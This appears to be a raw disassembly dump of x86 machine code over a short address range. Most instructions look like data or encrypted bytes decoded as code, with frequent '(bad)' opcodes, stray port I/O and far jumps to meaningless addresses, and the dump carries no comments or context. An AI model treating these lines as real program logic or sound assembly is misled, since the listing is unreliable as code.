  4206c5:	cli    
  4206c6:	nop
  4206c7:	stos   DWORD PTR es:[edi],eax
  4206c8:	mov    ecx,cs
  4206ca:	daa    
  4206cb:	aad    0x3f
  4206cd:	dec    ebp
  4206ce:	mov    bl,0xc9
  4206d0:	dec    edx
  4206d1:	out    0x6b,eax
  4206d3:	pop    ds
  4206d4:	gs out dx,eax
  4206d6:	test   eax,0x7d4ab729
  4206db:	aad    0x73
  4206dd:	push   0xb00fe82d
  4206e2:	xor    ebx,DWORD PTR [edi-0x16047caf]
  4206e8:	cmp    edi,DWORD PTR [ebx+0x2c]
  4206eb:	das    
  4206ec:	outs   dx,BYTE PTR ds:[esi]
  4206ed:	jle    0x4206e0
  4206ef:	jnp    0x4206a0
  4206f1:	cli    
  4206f2:	test   DWORD PTR [edx+0xe752a6f],esi
  4206f8:	or     cl,BYTE PTR [ebp+edx*2+0x1e]
  4206fc:	push   ebx
  4206fd:	cdq    
  4206fe:	xchg   BYTE PTR [esi+0x22],bh
  420701:	pop    edx
  420702:	jg     0x42074e
  420704:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420705:	xor    ebp,ebx
  420707:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420708:	mov    bl,0x93
  42070a:	popa   
  42070b:	adc    ebp,DWORD PTR [ebx+0x2dd03f5]
  420711:	dec    esp
  420712:	jbe    0x420750
  420714:	sub    dh,bl
  420716:	sbb    ch,BYTE PTR [esi-0xab35212]
  42071c:	adc    ah,ch
  42071e:	shl    ecx,1
  420720:	dec    ebp
  420721:	inc    ecx
  420722:	in     al,0xcc
  420724:	xchg   esp,eax
  420725:	pop    es
  420726:	inc    ebx
  420727:	jnp    0x42070e
  420729:	xchg   DWORD PTR [esp+esi*1-0x7c92c571],ebx
  420730:	or     eax,0xb692596a
  420735:	xchg   edx,ebp
  420737:	cld    
  420738:	jecxz  0x42078e
  42073a:	sbb    DWORD PTR fs:[eax+0x662ca214],eax
  420741:	mov    ebp,0x48387657
  420746:	jns    0x4206d8
  420748:	mov    dl,0x29
  42074a:	test   BYTE PTR [ebx+0x4714462d],0x1b
  420751:	or     ebx,ebx
  420753:	mov    eax,0x908965a
  420758:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420759:	loopne 0x420753
  42075b:	jge    0x4206f8
  42075d:	cmp    al,0xf7
  42075f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420760:	or     DWORD PTR [ecx],edx
  420762:	xchg   DWORD PTR [eax],ebp
  420764:	nop
  420765:	dec    ebx
  420766:	dec    edi
  420767:	mov    dh,0xfb
  420769:	jne    0x4207b4
  42076b:	dec    ecx
  42076c:	adc    eax,0x41e7e934
  420771:	pop    eax
  420772:	das    
  420773:	sbb    dh,BYTE PTR [edx+0x6d]
  420776:	cmp    BYTE PTR [edx-0x440951b0],al
  42077c:	adc    esp,DWORD PTR [edi]
  42077e:	or     al,0xcc
  420780:	or     BYTE PTR [ebx+0x62],al
  420783:	into   
  420784:	mov    ecx,0x789e829c
  420789:	imul   DWORD PTR [ebx+0x1a22866d]
  42078f:	loop   0x4207b4
	...
  4207f1:	add    BYTE PTR [eax],al
  4207f3:	add    BYTE PTR [ecx-0x587fdad1],cl
  4207f9:	mov    ch,BYTE PTR [ebp-0x2390c6d1]
  4207ff:	pusha  
  420800:	mov    ss:0x5a7a6398,eax
  420806:	add    DWORD PTR [eax],eax
  420808:	add    eax,0x4000001
  42080d:	xchg   ecx,eax
  42080e:	jb     0x4207b5
  420810:	mov    edx,0xeb3d87a4
  420815:	fwait
  420816:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420817:	iret   
  420818:	fucomip st,st(1)
  42081a:	dec    eax
  42081b:	lds    ebp,FWORD PTR [edx+0x1aecdba3]
  420821:	or     bl,bh
  420823:	mov    al,0xe5
  420825:	mov    ebp,0xedce7d74
  42082a:	cmp    al,0xb6
  42082c:	and    eax,0x619a77c2
  420831:	jmp    0x4e6c:0xe9ca624c
  420838:	ret    0xd1ab
  42083b:	dec    esp
  42083c:	jno    0x4207de
  42083e:	jle    0x42080d
  420840:	fist   DWORD PTR [edx]
  420842:	jb     0x420884
  420844:	lods   eax,DWORD PTR ds:[esi]
  420845:	or     eax,0x7fb72197
  42084a:	jl     0x4208bf
  42084c:	rcr    DWORD PTR [esi],1
  42084e:	adc    ch,al
  420850:	call   0xe2e7:0x6e81c086
  420857:	sub    al,0x9f
  420859:	in     eax,dx
  42085a:	aad    0x84
  42085c:	cli    
  42085d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42085e:	pop    es
  42085f:	mov    ah,0xfa
  420861:	nop
  420862:	mov    ah,0x50
  420864:	mov    ebx,eax
  420866:	mov    ebx,0xbcea2895
  42086b:	outs   dx,DWORD PTR ds:[esi]
  42086c:	inc    ebx
  42086d:	or     DWORD PTR [ebx-0x26e5c004],ebp
  420873:	sbb    edi,DWORD PTR [edi+esi*1]
  420876:	or     al,0xea
  420878:	xchg   DWORD PTR [edi+0x17],edi
  42087b:	cld    
  42087c:	call   0xded4:0x3135528c
  420883:	je     0x4208a1
  420885:	fwait
  420886:	into   
  420887:	out    0xf3,al
  420889:	mov    cl,0x38
  42088b:	sub    ah,dl
  42088d:	enter  0xb64c,0x31
  420891:	xchg   DWORD PTR [edi],ebx
  420893:	sub    DWORD PTR [edi-0x6c],esp
  420896:	cmp    ch,BYTE PTR [eax+0x152c1386]
  42089c:	in     eax,0x58
  42089e:	pop    ecx
  42089f:	shl    eax,0xbb
  4208a2:	lea    ebp,[edx+0x60be75d8]
  4208a8:	imul   ecx,ebp,0x40
  4208ab:	pop    esi
  4208ac:	in     eax,dx
  4208ad:	cmp    ch,bl
  4208af:	add    BYTE PTR [eax],dh
  4208b1:	into   
  4208b2:	jne    0x4208c1
  4208b4:	push   0x69
  4208b6:	push   ebp
  4208b7:	jmp    0x44a71621
  4208bc:	ss adc esi,ecx
  4208bf:	xchg   ecx,eax
  4208c0:	push   ebx
  4208c1:	es push esp
  4208c3:	jno    0x4208a2
  4208c5:	out    dx,al
  4208c6:	dec    edx
  4208c7:	or     DWORD PTR [ebx],esp
  4208c9:	jg     0x420883
  4208cb:	nop
  4208cc:	xor    BYTE PTR [eax+ebx*8+0xf9d1fa7],dh
  4208d3:	adc    ebx,DWORD PTR [edx+ebp*4+0x15]
  4208d7:	xor    dl,dl
  4208d9:	inc    esi
  4208da:	or     ch,BYTE PTR [esi*1+0xf7ee902]
  4208e1:	pop    ss
  4208e2:	loop   0x420876
  4208e4:	in     eax,0x9d
  4208e6:	and    DWORD PTR ds:0x91c2c907,ebp
  4208ec:	bound  edx,QWORD PTR [ecx-0x6c44a751]
  4208f2:	rcl    BYTE PTR ds:0xcd01a90c,cl
  4208f8:	sub    DWORD PTR [edx],ecx
  4208fa:	out    dx,eax
  4208fb:	mov    ebp,0x8814d82f
  420900:	sub    ebx,DWORD PTR [esi]
  420902:	jmp    FWORD PTR [ecx-0x7eeda2a0]
  420908:	xor    ebx,DWORD PTR [eax-0x43183749]
  42090e:	or     al,0xf1
  420910:	xchg   edi,eax
	...
  420971:	add    BYTE PTR [eax],al
  420973:	add    ah,bl
  420975:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420976:	jae    0x4209c5
  420978:	jnp    0x420959
  42097a:	(bad)  
  42097b:	mov    ch,0xd2
  42097d:	ja     0x4209dd
  42097f:	mov    dh,0x6f
  420981:	mov    esp,esp
  420983:	add    DWORD PTR [edi+0x5b],edi
  420986:	add    DWORD PTR [eax],eax
  420988:	add    eax,0xc5000001
  42098d:	cwde   
  42098e:	jmp    0xc283:0x807b1110
  420995:	fld    st(4)
  420997:	pushf  
  420998:	mov    ?,ebp
  42099a:	cld    
  42099b:	push   cs
  42099c:	outs   dx,BYTE PTR ds:[esi]
  42099d:	push   ecx
  42099e:	pop    ss
  42099f:	adc    DWORD PTR [edi+0x3af9450f],esp
  4209a5:	das    
  4209a6:	loope  0x420a25
  4209a8:	sub    ebp,DWORD PTR [edx-0xa36b9d2]
  4209ae:	(bad)  
  4209af:	idiv   DWORD PTR [edx-0x42]
  4209b2:	jb     0x420991
  4209b4:	mov    eax,ds:0xd35fd7ab
  4209b9:	sbb    eax,0xb48c5e9f
  4209be:	cmp    DWORD PTR [eax-0x5d],0x1c
  4209c2:	cmp    ecx,DWORD PTR [ecx+0x6cfd41b5]
  4209c8:	mov    edi,0x91b18dfc
  4209cd:	dec    edx
  4209ce:	jmp    0x4209fa
  4209d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209d1:	fsubr  st,st(2)
  4209d3:	aaa    
  4209d4:	aam    0xa0
  4209d6:	pop    esp
  4209d7:	enter  0x6b20,0xeb
  4209db:	sub    BYTE PTR [edi-0x7689c281],al
  4209e1:	sbb    edx,0xffffff9e
  4209e4:	(bad)  
  4209e5:	cs out 0x1f,al
  4209e8:	in     al,dx
  4209e9:	or     bl,BYTE PTR [ecx]
  4209eb:	or     BYTE PTR [ebx-0x3e],dl
  4209ee:	ss retf 
  4209f0:	fdiv   st,st(5)
  4209f2:	cmp    BYTE PTR [edi],ah
  4209f4:	or     BYTE PTR [ecx],ah
  4209f6:	loop   0x420a77
  4209f8:	rcl    DWORD PTR ds:0xe2d63b70,cl
  4209fe:	sbb    BYTE PTR [esi-0x18],ah
  420a01:	mov    dh,0x60
  420a03:	add    ch,BYTE PTR [ecx-0x381ffb51]
  420a09:	sub    al,0x49
  420a0b:	push   ebp
  420a0c:	test   eax,0xb5468995
  420a11:	xchg   edx,eax
  420a12:	popa   
  420a13:	and    eax,0x5b0853e1
  420a18:	inc    ebp
  420a19:	outs   dx,DWORD PTR ds:[esi]
  420a1a:	call   0x3d7:0x174df0c9
  420a21:	mov    eax,0x678e59e7
  420a26:	mov    edx,0x9370c48a
  420a2b:	xchg   edx,eax
  420a2c:	arpl   bp,cx
  420a2e:	clc    
  420a2f:	and    DWORD PTR [eax+0x46],0x49887cdc
  420a36:	or     eax,0xf6eb4ee9
  420a3b:	mov    WORD PTR [ecx-0x4e1f80cc],fs
  420a41:	adc    DWORD PTR [eax-0x2b],esp
  420a44:	clc    
  420a45:	dec    edi
  420a46:	popa   
  420a47:	iret   
  420a48:	add    esi,eax
  420a4a:	mov    edx,0x9b9f86d9
  420a4f:	lods   eax,DWORD PTR ds:[esi]
  420a50:	push   DWORD PTR [ebp+0x1945f3d0]
  420a56:	out    dx,eax
  420a57:	jno    0x420a43
  420a59:	add    al,0x86
  420a5b:	(bad)  
  420a5c:	cmp    ecx,DWORD PTR [eax+0x3bc95526]
  420a62:	and    dh,dl
  420a64:	popf   
  420a65:	push   cs
  420a66:	out    dx,al
  420a67:	leave  
  420a68:	in     al,dx
  420a69:	xchg   ebx,eax
  420a6a:	mov    cl,0xc1
  420a6c:	inc    ebp
  420a6d:	fsubr  DWORD PTR [edi+0x811d743]
  420a73:	sar    DWORD PTR [ecx-0x7c73fc54],0x1c
  420a7a:	lods   al,BYTE PTR ds:[esi]
  420a7b:	mov    edi,0x78c227fb
  420a80:	icebp  
  420a81:	stos   DWORD PTR es:[edi],eax
  420a82:	cmp    DWORD PTR [esi-0x10b00fde],edi
  420a88:	cmp    eax,0xffffffe9
  420a8b:	pop    eax
  420a8c:	outs   dx,DWORD PTR ds:[esi]
  420a8d:	leave  
  420a8e:	xor    eax,0xdd42
	...
  420af3:	add    bh,bl
  420af5:	xor    ch,BYTE PTR [edi-0x6010ed]
  420afb:	(bad)  
  420afc:	xlat   BYTE PTR ds:[ebx]
  420afd:	out    dx,eax
  420afe:	(bad)  
  420aff:	cld    
  420b00:	xor    BYTE PTR [ebp+0x7f],0xe1
  420b04:	test   BYTE PTR [ecx+eax*1+0x0],bl
  420b08:	add    eax,0xf7000001
  420b0d:	and    dl,ah
  420b0f:	pop    edx
  420b10:	push   edi
  420b11:	jmp    0x7e1:0x78deb95b
  420b18:	sbb    BYTE PTR [eax],cl
  420b1a:	sub    edi,DWORD PTR [esp+edx*1]
  420b1d:	scas   eax,DWORD PTR es:[edi]
  420b1e:	test   BYTE PTR ds:0x22d6c204,bl
  420b24:	mov    edx,0x44d1e1b2
  420b29:	adc    al,0x72
  420b2b:	outs   dx,DWORD PTR ds:[esi]
  420b2c:	xchg   esi,eax
  420b2d:	xchg   esi,eax
  420b2e:	or     ah,BYTE PTR [eax]
  420b30:	adc    DWORD PTR [esi+0x9],0xffffffd7
  420b34:	sub    eax,0xb2234e25
  420b39:	cmp    eax,0x2f2f5a7e
  420b3e:	sub    ecx,ebp
  420b40:	lahf   
  420b41:	mov    ebp,0x41475ecd
  420b46:	cmp    BYTE PTR [edi-0x22],ch
  420b49:	aad    0x16
  420b4b:	dec    esi
  420b4c:	scas   eax,DWORD PTR es:[edi]
  420b4d:	pop    ebp
  420b4e:	pop    esp
  420b4f:	cli    
  420b50:	ins    BYTE PTR es:[edi],dx
  420b51:	dec    ebx
  420b52:	push   ebp
  420b53:	dec    ecx
  420b54:	push   esp
  420b55:	mov    eax,0xc0046607
  420b5a:	sub    eax,0x7446c51
  420b5f:	and    DWORD PTR [eax+edx*4],esi
  420b62:	not    DWORD PTR [edx+0xa0472e]
  420b68:	test   DWORD PTR [edi+0x243eeade],edx
  420b6e:	sahf   
  420b6f:	fdivr  QWORD PTR [eax]
  420b71:	(bad)  
  420b72:	sbb    al,0x15
  420b74:	jmp    0x865c227d
  420b79:	test   ebx,ebx
  420b7b:	lock imul edx,edi,0xffffffb3
  420b7f:	jmp    0x821d:0xaccea98e
  420b86:	test   eax,0xdff297ea
  420b8b:	jecxz  0x420ba7
  420b8d:	mov    bh,0xf4
  420b8f:	dec    esp
  420b90:	les    ecx,FWORD PTR [esi+0x77e7d35c]
  420b96:	jecxz  0x420bcd
  420b98:	mov    cs,WORD PTR [edx-0x6633f9ab]
  420b9e:	outs   dx,DWORD PTR ds:[esi]
  420b9f:	sub    al,0x48
  420ba1:	adc    ecx,DWORD PTR [esi+ebx*8-0x724e9784]
  420ba8:	out    dx,eax
  420ba9:	mov    esi,DWORD PTR gs:[ebx-0x2f199b56]
  420bb0:	pop    es
  420bb1:	lock fisttp QWORD PTR [edi+0x7b0db61e]
  420bb8:	mov    ecx,0x96e073a0
  420bbd:	loop   0x420b91
  420bbf:	fist   DWORD PTR [esi+0x7abd26f6]
  420bc5:	stc    
  420bc6:	push   esi
  420bc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bc8:	dec    DWORD PTR [ebp+0x256c91f2]
  420bce:	ret    0x421f
  420bd1:	sub    ch,BYTE PTR [edx]
  420bd3:	daa    
  420bd4:	and    eax,ebx
  420bd6:	dec    DWORD PTR fs:[edx+0x384c91da]
  420bdd:	sbb    ch,ah
  420bdf:	aad    0x2a
  420be1:	js     0x420bd6
  420be3:	popf   
  420be4:	mov    al,ds:0x5f1c3d64
  420be9:	lods   eax,DWORD PTR ds:[esi]
  420bea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420beb:	mov    ds:0x48f5edf3,al
  420bf0:	into   
  420bf1:	cwde   
  420bf2:	mov    ecx,0xa568b391
  420bf7:	xor    esp,DWORD PTR [ecx+0x1e9f107]
  420bfd:	or     ecx,esi
  420bff:	xor    ebx,edx
  420c01:	loopne 0x420c6e
  420c03:	sub    edx,DWORD PTR [ecx]
  420c05:	pop    edx
  420c06:	add    eax,0x919ad6cf
  420c0b:	cdq    
  420c0c:	les    esp,FWORD PTR cs:[esi+0x5352]
	...
  420c73:	add    BYTE PTR [edx-0x604ef4eb],cl
  420c79:	mov    edi,0x886e3fba
  420c7e:	add    ebp,esp
  420c80:	ret    0x6f79
  420c83:	sbb    DWORD PTR [ecx+0x500015d],ecx
  420c89:	add    DWORD PTR [eax],eax
  420c8b:	add    BYTE PTR [ebx-0x71],ch
  420c8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c8f:	ins    BYTE PTR es:[edi],dx
  420c90:	mov    bx,0xd9b
  420c94:	js     0x420c69
  420c96:	sub    dh,BYTE PTR [ecx]
  420c98:	ins    DWORD PTR es:[edi],dx
  420c99:	inc    edi
  420c9a:	daa    
  420c9b:	dec    eax
  420c9c:	jo     0x420c2b
  420c9e:	sti    
  420c9f:	shl    DWORD PTR [ecx-0x60c4651d],1
  420ca5:	add    DWORD PTR [edi],ebp
  420ca7:	cmp    ebp,0x513c05ac
  420cad:	pop    esi
  420cae:	and    al,BYTE PTR [edi]
  420cb0:	and    dl,BYTE PTR [edi]
  420cb2:	stos   DWORD PTR es:[edi],eax
  420cb3:	push   esp
  420cb4:	mov    eax,0x4ed99aee
  420cb9:	mov    WORD PTR [ebp+edx*1-0x1f],cs
  420cbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420cbe:	repnz (bad) 
  420cc0:	les    edi,FWORD PTR [edi]
  420cc2:	hlt    
  420cc3:	inc    ecx
  420cc4:	pop    ss
  420cc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420cc6:	cmp    DWORD PTR [edi-0x55b7f47f],edx
  420ccc:	sahf   
  420ccd:	pop    ebx
  420ccf:	xchg   ebp,eax
  420cd0:	mov    eax,0xde3b19e
  420cd5:	(bad)  
  420cd6:	fisubr DWORD PTR [ecx+0x21ad0852]
  420cdc:	pushf  
  420cdd:	aad    0x8d
  420cdf:	or     BYTE PTR [eax-0x2],bh
  420ce2:	les    eax,FWORD PTR [edx-0x2a]
  420ce5:	rol    BYTE PTR [ebx],1
  420ce7:	outs   dx,BYTE PTR ds:[esi]
  420ce8:	jl     0x420d49
  420cea:	inc    esi
  420ceb:	or     edi,eax
  420ced:	cmp    dh,BYTE PTR [edx+0x53f024a5]
  420cf3:	stc    
  420cf4:	out    dx,eax
  420cf5:	mov    esi,0x3f770eac
  420cfa:	add    eax,0x2beb372b
  420cff:	fs stos BYTE PTR es:[edi],al
  420d01:	retf   0xb7ff
  420d04:	dec    esp
  420d05:	stos   BYTE PTR es:[edi],al
  420d06:	or     cl,al
  420d08:	lea    esi,[esi]
  420d0a:	add    DWORD PTR [ecx],edx
  420d0c:	mov    bh,0x3a
  420d0e:	push   cs
  420d0f:	test   al,0xf0
  420d11:	sub    DWORD PTR [edi-0x49],ecx
  420d14:	pop    esp
  420d15:	(bad)  
  420d16:	push   ds
  420d17:	xchg   ebx,eax
  420d18:	or     ecx,DWORD PTR [esi-0x6f]
  420d1b:	mov    bl,0xff
  420d1d:	sbb    ch,0x35
  420d20:	push   edx
  420d21:	add    DWORD PTR [eax],0xf7e652b2
  420d27:	xor    BYTE PTR [esi],al
  420d29:	push   esi
  420d2a:	mov    dl,0x53
  420d2c:	(bad)  
  420d2d:	xchg   edx,eax
  420d2e:	mov    esp,0xb9b42269
  420d33:	dec    ecx
  420d34:	jecxz  0x420cff
  420d36:	pop    ebx
  420d37:	cdq    
  420d38:	int3   
  420d39:	retf   0x8c7
  420d3c:	adc    DWORD PTR [esi-0x53],ecx
  420d3f:	cmp    BYTE PTR [ebp-0x48],cl
  420d42:	cmp    BYTE PTR [edi-0x71],bl
  420d45:	imul   ecx,DWORD PTR ds:0x3a556316,0x75
  420d4c:	pop    ebp
  420d4d:	xor    BYTE PTR [edi+ebx*4-0x1],cl
  420d51:	(bad)  [eax+edi*8+0x75895cf7]
  420d58:	push   edi
  420d59:	pop    ebp
  420d5a:	mov    ch,0x32
  420d5c:	pushf  
  420d5d:	mov    al,0x20
  420d5f:	repz mov edx,0xfdc3cbdd
  420d65:	or     BYTE PTR [ecx],al
  420d67:	popf   
  420d68:	imul   eax,DWORD PTR [esi-0x48],0x9a49196f
  420d6f:	adc    ebp,DWORD PTR [edi-0x73]
  420d72:	jp     0x420d97
  420d74:	in     eax,0x8c
  420d76:	and    DWORD PTR [ebx-0x138964b3],0xae8fb750
  420d80:	repz (bad) 
  420d82:	mov    ecx,0xe4b3c63d
  420d87:	pop    ss
  420d88:	pushf  
  420d89:	jg     0x420d66
  420d8b:	ja     0x420d5b
  420d8d:	dec    ebp
  420d8e:	rcl    DWORD PTR [ecx],cl
  420d90:	mov    eax,0x0
	...
  420df1:	add    BYTE PTR [eax],al
  420df3:	add    bh,ah
  420df5:	push   ds
  420df6:	into   
  420df7:	push   0x9fe7f8ff
  420dfc:	push   esi
  420dfd:	inc    edi
  420dfe:	lahf   
  420dff:	mov    al,ds:0x838ecb35
  420e04:	mov    ds,WORD PTR [esi+0x1]
  420e07:	add    BYTE PTR ds:0x52000001,al
  420e0d:	les    ecx,FWORD PTR [eax+0x2e437ed0]
  420e13:	fld    TBYTE PTR [edx+eax*2]
  420e16:	add    al,0x62
  420e18:	cmc    
  420e19:	pop    ebx
  420e1a:	jge    0x420e6b
  420e1c:	inc    eax
  420e1d:	ins    BYTE PTR es:[edi],dx
  420e1e:	sub    eax,0x2ad8b77d
  420e23:	(bad)  
  420e24:	cmp    al,0x38
  420e26:	dec    ebp
  420e27:	xchg   edi,edx
  420e29:	cmp    al,0xba
  420e2b:	push   0x3c
  420e2d:	or     eax,ebp
  420e2f:	ins    BYTE PTR es:[edi],dx
  420e30:	addr16 cmp al,0x81
  420e33:	mov    ds:0x2563ec7e,eax
  420e38:	add    eax,ebx
  420e3a:	mov    al,ds:0xe630ef82
  420e3f:	(bad)  
  420e40:	in     al,dx
  420e41:	nop
  420e42:	mov    al,0xdd
  420e44:	add    esi,DWORD PTR [esi-0x61]
  420e47:	jne    0x420e32
  420e49:	inc    eax
  420e4a:	hlt    
  420e4b:	test   eax,0x3f28b834
  420e50:	adc    eax,0xb79f2cec
  420e55:	add    bl,BYTE PTR [eax+0x68f33a1a]
  420e5b:	out    0xb3,eax
  420e5d:	stos   BYTE PTR es:[edi],al
  420e5e:	out    0xe0,eax
  420e60:	in     eax,0x34
  420e62:	fsubr  QWORD PTR [ebp+0x46]
  420e65:	jecxz  0x420e6b
  420e67:	add    DWORD PTR [ebx],0xfffffffd
  420e6a:	mov    ebp,DWORD PTR [esi+0x19fb31cc]
  420e70:	pop    edx
  420e71:	dec    ecx
  420e72:	dec    esi
  420e73:	dec    edx
  420e74:	mov    ebx,0x73fe69c0
  420e79:	test   DWORD PTR ds:0xed6bebd1,ebx
  420e7f:	pop    esi
  420e80:	jns    0x420ef0
  420e82:	retf   
  420e83:	retf   0xac7f
  420e86:	push   ebp
  420e87:	adc    edi,DWORD PTR [ecx]
  420e89:	(bad)  
  420e8a:	js     0x420edc
  420e8c:	mov    eax,ds:0x819abc29
  420e91:	cmp    al,dh
  420e93:	adc    eax,0x6e5f8bdb
  420e98:	jecxz  0x420ee6
  420e9a:	push   edx
  420e9b:	pop    esi
  420e9c:	mov    bh,0x46
  420e9e:	loop   0x420e9c
  420ea0:	mov    esp,0x4b58fad7
  420ea5:	je     0x420ed1
  420ea7:	push   edx
  420ea8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ea9:	mov    dl,0x33
  420eab:	xchg   ecx,eax
  420eac:	test   eax,0x802a29df
  420eb1:	inc    edi
  420eb2:	mov    edi,0xaddf2254
  420eb7:	dec    esp
  420eb8:	loop   0x420e7c
  420eba:	ror    DWORD PTR [edi-0x21],0xa4
  420ebe:	mov    ch,0x50
  420ec0:	stos   DWORD PTR es:[edi],eax
  420ec1:	not    edi
  420ec3:	cmp    dl,BYTE PTR [ecx-0x3e65e61d]
  420ec9:	adc    bl,BYTE PTR [ecx+0x19]
  420ecc:	fidiv  DWORD PTR [edx-0x3e]
  420ecf:	lods   al,BYTE PTR ds:[esi]
  420ed0:	inc    ebp
  420ed1:	(bad)  
  420ed2:	call   0x5299b81f
  420ed7:	neg    cl
  420ed9:	pop    ds
  420eda:	or     al,0x63
  420edc:	add    BYTE PTR [esp+eax*4+0x726d8ef],cl
  420ee3:	xchg   esp,eax
  420ee4:	dec    ebx
  420ee5:	lea    edi,[edi]
  420ee7:	or     cl,BYTE PTR [esi+ecx*4]
  420eea:	cmp    edi,DWORD PTR [ebx-0x6138dd09]
  420ef0:	mov    edx,0x6670782d
  420ef5:	into   
  420ef6:	cmp    eax,0x2bcfb089
  420efb:	les    ebp,FWORD PTR [edi+0x5d61f139]
  420f01:	adc    eax,edi
  420f03:	xor    BYTE PTR [esi+0x2f],dh
  420f06:	xchg   ebx,eax
  420f07:	sub    DWORD PTR [ecx+0x27],ebp
  420f0a:	retf   
  420f0b:	fwait
  420f0c:	mov    bh,0x74
  420f0e:	jnp    0x420f2c
  420f10:	sub    eax,DWORD PTR [eax]
	...
  420f72:	add    BYTE PTR [eax],al
  420f74:	and    BYTE PTR [edi-0x28082cbe],dl
  420f7a:	mov    cl,0xf7
  420f7c:	jg     0x420f6b
  420f7e:	or     esp,DWORD PTR [esi-0x6241c4bf]
  420f84:	xchg   ebx,eax
  420f85:	pop    edi
  420f86:	add    DWORD PTR [eax],eax
  420f88:	add    eax,0x1e000001
  420f8d:	add    al,0x80
  420f8f:	ror    DWORD PTR [ecx-0x71],cl
  420f92:	aam    0x74
  420f94:	pusha  
  420f95:	add    DWORD PTR [esp+eax*2+0x69],0xc63112b
  420f9d:	mov    cl,BYTE PTR [ecx-0x37]
  420fa0:	mov    fs,ecx
  420fa2:	ins    DWORD PTR es:[edi],dx
  420fa3:	adc    al,0xa3
  420fa5:	fldcw  WORD PTR [edx]
  420fa7:	dec    esp
  420fa8:	adc    al,0x66
  420faa:	push   ecx
  420fab:	rol    BYTE PTR es:[edi+0x58],cl
  420faf:	pop    edx
  420fb0:	jmp    0x4ce1e21b
  420fb5:	sbb    bl,BYTE PTR [ecx]
  420fb7:	aad    0x8e
  420fb9:	jae    0x42102e
  420fbb:	sbb    BYTE PTR [esi+0x76],ch
  420fbe:	inc    ecx
  420fbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420fc0:	adc    BYTE PTR [edi+0x57],0xe7
  420fc4:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  420fc6:	dec    edx
  420fc7:	mov    ecx,0x4df4b7dc
  420fcc:	fbld   TBYTE PTR [ecx+0x7b]
  420fcf:	xchg   ebx,eax
  420fd0:	std    
  420fd1:	call   0xb8057446
  420fd6:	cmp    al,0x53
  420fd8:	std    
  420fd9:	mov    ds:0x79cabdab,eax
  420fde:	test   eax,0x1482bae6
  420fe3:	fwait
  420fe4:	sub    al,0xf0
  420fe6:	push   eax
  420fe7:	fdivr  DWORD PTR [ecx+0x60]
  420fea:	xchg   ebx,eax
  420feb:	xor    eax,0x95eaa671
  420ff0:	mov    dl,0x45
  420ff2:	push   esp
  420ff3:	jmp    0x42102d
  420ff5:	inc    ebx
  420ff6:	mov    esp,0x2bea91f3
  420ffb:	jmp    0x42105b
  420ffd:	inc    esi
  420ffe:	adc    al,0x8c
  421000:	retf   0x4e1d
  421003:	repnz cmp ebx,ebx
  421006:	(bad)  
  421007:	xor    BYTE PTR [ecx+0x28f8ae11],ch
  42100d:	aaa    
  42100e:	jb     0x420ff1
  421010:	and    al,0xd1
  421012:	adc    ebx,DWORD PTR [ebx-0x18]
  421015:	arpl   WORD PTR [esi],bp
  421017:	addr16 addr16 (bad) 
  42101a:	ins    DWORD PTR es:[edi],dx
  42101b:	inc    ebx
  42101c:	or     cl,dh
  42101e:	iret   
  42101f:	mov    bl,0xb0
  421021:	xchg   ecx,eax
  421022:	xchg   edi,eax
  421023:	sub    BYTE PTR [eax+eax*2],0xd3
  421027:	mov    edx,ebp
  421029:	icebp  
  42102a:	jmp    0x322f373e
  42102f:	(bad)  
  421030:	cli    
  421031:	fcmovbe st,st(2)
  421033:	push   ebx
  421034:	pop    es
  421035:	iret   
  421036:	mov    ah,0xc7
  421038:	push   0x5e20cb68
  42103d:	jecxz  0x4210a7
  42103f:	pushf  
  421040:	hlt    
  421041:	imul   BYTE PTR [esi*1+0xa230c6b]
  421048:	add    BYTE PTR [esi],0x2b
  42104b:	xchg   edi,eax
  42104c:	fistp  WORD PTR [ecx+0x6e74a447]
  421052:	and    al,0xa9
  421054:	scas   eax,DWORD PTR es:[edi]
  421055:	pusha  
  421056:	sub    eax,0xac75c781
  42105b:	xchg   edx,eax
  42105c:	imul   eax,edx,0x52a3b03e
  421062:	outs   dx,DWORD PTR ds:[esi]
  421063:	mov    eax,ds:0x94752892
  421068:	mov    eax,ds:0x143fc28e
  42106d:	and    dl,BYTE PTR [esi]
  42106f:	xchg   edx,eax
  421070:	jmp    0x5b9e:0xb6a943a0
  421077:	test   ch,bh
  421079:	pop    esp
  42107a:	jne    0x4210b7
  42107c:	in     eax,dx
  42107d:	xlat   BYTE PTR ds:[ebx]
  42107e:	xchg   ebx,eax
  42107f:	retf   
  421080:	out    dx,al
  421081:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421082:	mov    ch,0x80
  421084:	mov    bl,dh
  421086:	stos   DWORD PTR es:[edi],eax
  421087:	fcmovnu st,st(1)
  421089:	sbb    al,0x55
  42108b:	mov    WORD PTR [ebp-0x5f],?
  42108e:	mov    ch,0x8e
  421090:	mov    BYTE PTR [eax],0x0
	...
  4210f3:	add    BYTE PTR [edi-0x243925a2],bl
  4210f9:	(bad)  
  4210fa:	lahf   
  4210fb:	pop    edi
  4210fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210fd:	jne    0x4210e1
  4210ff:	mov    es,WORD PTR [ebx-0x67359540]
  421105:	pusha  
  421106:	add    DWORD PTR [eax],eax
  421108:	add    eax,0xf9000001
  42110d:	ds daa 
  42110f:	cli    
  421110:	and    al,0x6b
  421112:	sub    al,0x6f
  421114:	dec    esi
  421115:	sub    eax,0x97f1660a
  42111a:	xchg   edx,eax
  42111c:	cld    
  42111d:	push   edi
  42111e:	jns    0x4210e6
